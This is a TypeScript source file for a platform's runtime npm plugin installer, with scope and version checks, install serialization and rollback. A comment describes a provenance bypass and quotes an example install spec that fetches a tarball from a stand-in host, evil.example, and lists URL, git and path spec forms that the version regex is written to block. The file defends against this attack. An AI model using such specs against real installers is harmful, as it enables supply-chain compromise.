/**
 * Plugin Install/Uninstall — npm package management at runtime.
 *
 * Redis-free: installed nodes register into the IN-MEMORY registry (workflow pulls
 * the catalog from Unoverse over HTTP — there is no Redis catalog to write), and
 * plugin state persists to Postgres via serviceCalls (state.ts → workflow
 * /plugins/state). Installs are restricted to the official Gravity scopes — this is
 * the safe-by-design fix for the old unauthenticated /plugins/install RCE.
 */

import * as fs from "fs";
import * as path from "path";
import { execFile } from "child_process";
import { promisify } from "util";

// Async — a sync npm install would freeze the single uWS event loop for seconds to
// minutes, stalling every live audio frame, SSE stream, and WS message on this process.
const execFileAsync = promisify(execFile);
import { getNodeRegistry, getPluginNodeMap, deleteNode } from "../registry.js";
import { createNodeServiceAPI } from "../platform/index.js";
import { warnMissingNodeMeta } from "./redis.js";
import { unloadPlugin, getPluginsDir, ensurePluginsDir, clearModuleCache, importPluginModule } from "./loader.js";
import { getPluginState, setPluginState, persistPluginState, removePluginState } from "./state.js";
import { MARKETPLACE_PATH } from "../paths.js";

// Trust is first-party only: nodes install from the @unoverse-platform npm scope
// (the org we control publish access to). Anything else must be self-built (home
// nodes in apps/unoverse/nodes, or a customer-mounted PACKAGES_PATH package).
const ALLOWED_SCOPES = ["@unoverse-platform"];

export function isAllowedPackage(name: string): boolean {
  return ALLOWED_SCOPES.some((scope) => name.startsWith(`${scope}/`));
}

/**
 * THE VERSION IS PART OF THE PROVENANCE CONTROL, and it was not being checked.
 *
 * npm's install spec is `<name>@<spec>`, and that second half is not just a version. It
 * may be a URL, a git ref or a file path — `npm install foo@https://evil.example/x.tgz`
 * fetches and runs that tarball. So a scope check on the NAME alone was bypassable:
 * `@unoverse-platform/anything@https://…` passes `isAllowedPackage` and installs code from
 * somewhere else entirely, which is exactly what ALLOWED_SCOPES exists to prevent.
 *
 * The character set IS the control. `:` `/` and `\` are what every dangerous form needs —
 * `https://`, `file:`, `github:`, `git+ssh://`, `npm:`, `attacker/repo` (npm's GitHub
 * shorthand), `../../evil` — and no version or range contains any of them. Everything a
 * real version does need is here: digits, dots, prerelease hyphens, range operators, and
 * the spaces and pipes of `1.0.0 || 2.0.0`.
 *
 * No leading-character rule: a range legitimately STARTS with an operator (`^1.2.3`,
 * `>=1.0.0`, `*`), and requiring a digit or letter first rejected all of them.
 */
const SAFE_VERSION = /^[A-Za-z0-9.+^~><=\-|* ]+$/;

export function isAllowedVersion(version: string): boolean {
  return SAFE_VERSION.test(version);
}

// Serialize installs: npm cannot run two installs into the same prefix at once — they
// race on node_modules and corrupt each other ("Cannot cd into @smithy/…, tarball data
// seems to be corrupted"). A single in-process chain makes concurrent Install clicks
// (and a reconcile firing alongside) queue instead of racing.
let installLock: Promise<unknown> = Promise.resolve();
function serialize<T>(fn: () => Promise<T>): Promise<T> {
  const run = installLock.then(fn, fn);
  installLock = run.then(
    () => undefined,
    () => undefined,
  );
  return run;
}

// npm intermittently reports a corrupted tarball / ENOENT while extracting a large
// dependency fan-out (the AWS SDK pulls hundreds of @smithy/* packages). One
// clean-cache retry clears a poisoned cache and any half-written node_modules.
async function npmInstall(spec: string, cwd: string): Promise<void> {
  const args = ["install", spec, "--no-audit", "--no-fund"];
  try {
    await execFileAsync("npm", args, { cwd });
  } catch (err: any) {
    const msg = String(err?.stderr ?? err?.message ?? err);
    if (!/corrupt|ENOENT|EINTEGRITY|integrity/i.test(msg)) throw err;
    console.warn(`[plugins] npm install ${spec} hit a corrupt-tarball error; cleaning cache and retrying once`);
    await execFileAsync("npm", ["cache", "clean", "--force"], { cwd }).catch(() => {});
    await execFileAsync("npm", args, { cwd });
  }
}

export async function installPlugin(
  name: string,
  version?: string,
): Promise<{ success: boolean; nodes: string[]; version: string }> {
  if (!isAllowedPackage(name)) {
    throw new Error(`Package "${name}" is not in an allowed scope. Allowed: ${ALLOWED_SCOPES.join(", ")}`);
  }
  // Checked HERE, beside the scope check, because together they are one control: the scope
  // says who published it and the version says where it comes from. Checking only the first
  // leaves the second free to point anywhere.
  if (version !== undefined && !isAllowedVersion(version)) {
    throw new Error(
      `Version "${version}" is not a version. npm would read it as a URL, a git ref or a file path, ` +
        `which would install code from outside ${ALLOWED_SCOPES.join(", ")} while the name still looked allowed.`,
    );
  }
  // Run under the install lock so a second Install (or the reconcile) can't npm-install
  // into the same prefix concurrently and corrupt node_modules.
  return serialize(() => installPluginLocked(name, version));
}

async function installPluginLocked(
  name: string,
  version?: string,
): Promise<{ success: boolean; nodes: string[]; version: string }> {
  const PLUGINS_DIR = getPluginsDir();
  ensurePluginsDir();

  // In dev, prefer local packages-marketplace source over npm
  const marketplacePath = MARKETPLACE_PATH;
  const shortName = name.replace(/@[^/]+\//, "");
  const localPath = path.join(marketplacePath, shortName);
  const useLocal = fs.existsSync(localPath);

  const nodeRegistry = getNodeRegistry();
  const pluginNodeMap = getPluginNodeMap();
  // Snapshot the registry up front so a failed install can un-register exactly the node
  // types this attempt added — making install atomic (fully applied or fully rolled back).
  const nodesBefore = new Set(nodeRegistry.keys());

  try {
    let installedVersion: string;
    let pluginPath: string;

    if (useLocal) {
      console.log(`[plugins] Loading ${name} from local source: ${localPath}`);
      pluginPath = localPath;
      const localPkg = JSON.parse(fs.readFileSync(path.join(localPath, "package.json"), "utf-8"));
      installedVersion = localPkg.version;
    } else {
      const spec = version ? `${name}@${version}` : name;
      console.log(`[plugins] Installing ${spec} from npm...`);
      await npmInstall(spec, PLUGINS_DIR);

      const installedPkgPath = path.join(PLUGINS_DIR, "node_modules", name, "package.json");
      installedVersion = fs.existsSync(installedPkgPath)
        ? JSON.parse(fs.readFileSync(installedPkgPath, "utf-8")).version
        : version || "latest";
      pluginPath = path.join(PLUGINS_DIR, "node_modules", name);
    }

    // Clear module cache so updated code is always loaded fresh
    clearModuleCache(pluginPath);

    const api = createNodeServiceAPI();
    const pkg = await importPluginModule(pluginPath);
    const plugin = pkg.default || pkg;

    const nodeTypes: string[] = [];
    if (plugin && typeof plugin.setup === "function") {
      await plugin.setup(api);
      for (const [type] of nodeRegistry) {
        if (!nodesBefore.has(type)) nodeTypes.push(type);
      }
    }

    pluginNodeMap.set(name, nodeTypes);

    // Nodes (and any credentials) are now live in the in-memory registry — workflow
    // sees them on its next catalog pull (GET /nodes). Flag whenToUse gaps now.
    const registeredDefs = nodeTypes.map((t) => nodeRegistry.get(t)).filter(Boolean);
    warnMissingNodeMeta(registeredDefs, `import:${name}`);

    // Read package metadata
    const pkgJsonPath = path.join(pluginPath, "package.json");
    let pkgMeta: any = {};
    if (fs.existsSync(pkgJsonPath)) {
      pkgMeta = JSON.parse(fs.readFileSync(pkgJsonPath, "utf-8"));
    }
    const gravity = pkgMeta.gravity || {};

    // Persist to Postgres (source of truth) + the in-memory state cache. This is LAST —
    // nothing is recorded as installed until load+register fully succeeded.
    //
    // KEEP-LATEST: the state row is SHARED across environments (one Postgres) and
    // means "the newest version anyone chose" — it never moves backward. Every
    // environment converges UP to it at boot (startup.ts reinstalls when disk is
    // older). A dev testing an upgrade locally therefore only ever advances prod,
    // never downgrades it. Local processes still prefer local source builds.
    const recordedVersion = (() => {
      const prev = getPluginState(name)?.version;
      if (!prev) return installedVersion;
      const pa = prev.split(".").map(Number);
      const pb = installedVersion.split(".").map(Number);
      if (pa.some(isNaN) || pb.some(isNaN)) return installedVersion;
      for (let i = 0; i < 3; i++) {
        if ((pa[i] ?? 0) > (pb[i] ?? 0)) return prev; // state already newer — keep it
        if ((pa[i] ?? 0) < (pb[i] ?? 0)) return installedVersion;
      }
      return installedVersion;
    })();
    const metadata = { description: pkgMeta.description, displayName: gravity.displayName, category: gravity.category, features: gravity.features, credentials: gravity.credentials };
    setPluginState(name, { enabled: true, version: recordedVersion, source: "npm", metadata });
    persistPluginState({ name, version: recordedVersion, source: "npm", enabled: true, metadata });

    console.log(`[plugins] Installed ${name}@${installedVersion} (${nodeTypes.length} nodes)`);
    return { success: true, nodes: nodeTypes, version: installedVersion };
  } catch (err: any) {
    // Roll back a partial install so it leaves no garbage and the next attempt is clean:
    //  - un-register any node types this attempt added,
    //  - drop the plugin→nodes map entry,
    //  - remove the (possibly half-written) npm package dir (never the local source).
    // The DB write above only runs on full success, so no phantom "installed" row remains.
    for (const type of [...nodeRegistry.keys()]) {
      if (!nodesBefore.has(type)) deleteNode(type);
    }
    pluginNodeMap.delete(name);
    if (!useLocal) {
      try {
        fs.rmSync(path.join(PLUGINS_DIR, "node_modules", name), { recursive: true, force: true });
      } catch {
        /* best-effort cleanup */
      }
    }
    console.warn(`[plugins] install ${name} failed — rolled back partial state: ${err?.message ?? err}`);
    throw err;
  }
}

export async function uninstallPlugin(name: string): Promise<{ success: boolean; removedNodes: string[] }> {
  const pluginNodeMap = getPluginNodeMap();
  const removedNodes = pluginNodeMap.get(name) || [];
  await unloadPlugin(name);

  // Remove from disk
  const PLUGINS_DIR = getPluginsDir();
  try {
    await execFileAsync("npm", ["uninstall", name], { cwd: PLUGINS_DIR });
  } catch (error: any) {
    console.warn(`[plugins] npm uninstall warning: ${error.message}`);
  }

  // Remove from in-memory state + Postgres
  removePluginState(name);

  console.log(`[plugins] Uninstalled ${name} (removed ${removedNodes.length} nodes)`);
  return { success: true, removedNodes };
}
